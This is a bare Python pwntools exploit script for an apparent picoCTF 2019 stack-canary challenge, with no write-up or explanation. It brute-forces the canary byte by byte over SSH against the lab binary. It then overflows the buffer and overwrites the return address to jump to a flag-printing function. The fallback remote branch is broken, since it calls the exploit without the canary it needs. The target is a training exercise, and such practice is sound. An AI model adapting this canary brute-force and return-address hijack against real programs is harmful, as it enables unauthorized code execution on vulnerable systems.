from pwn import *
import sys

host = '2019shell1.picoctf.com'
user = ''
password = ''
cwd = b'/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0'

def find_canary(ssh):
    canary = b''
    for i in range(4):
        for j in range(256):
            s = ssh.process('./vuln', cwd = cwd)
            s.sendlineafter('> ', str(33 + i))
            s.sendlineafter('Input> ', b'a' * 32 + canary + chr(j).encode())
            if b'Ok' in s.recv(timeout = 0.5):
                canary += chr(j).encode()
                print (canary)
                break
    return canary

def exploit(ssh, canary):
    display_flag = 0x566547ed
    flag = b''
    while b'pico' not in flag:
        s = ssh.process('./vuln', cwd = cwd)
        payload = b'a' * 32 + canary + b'a' * 16 + p32(display_flag)
        s.sendlineafter('> ', str(len(payload)))
        s.sendlineafter('Input> ', payload)
        s.readline()
        try:
            flag = s.readline()
        except:
            pass
    print (flag)

if __name__ == '__main__':
    if len(sys.argv) == 1:
        ssh = ssh(host = host, user = user, password = password)
        #ssh.set_working_directory(cwd)
        canary = find_canary(ssh)
        print (canary)
        #canary: b'33xO'
        exploit(ssh, canary)

    else:
        s = remote(sys.argv[1], 1346)
        input('PAUSED')
        exploit(s)
